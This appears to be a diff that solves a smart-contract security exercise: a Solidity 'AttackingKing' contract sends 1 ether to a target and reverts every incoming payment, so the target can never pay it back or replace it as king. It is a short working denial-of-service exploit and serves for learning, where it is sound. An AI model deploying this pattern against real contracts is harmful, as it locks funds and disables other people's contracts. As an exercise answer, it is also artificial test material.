@@ -11,6 +11,10 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        contractAddress.call{value: 10 ** 18}("");
+    }
+
+    receive() external payable {
+        revert("I'm still king!");
     }
 }
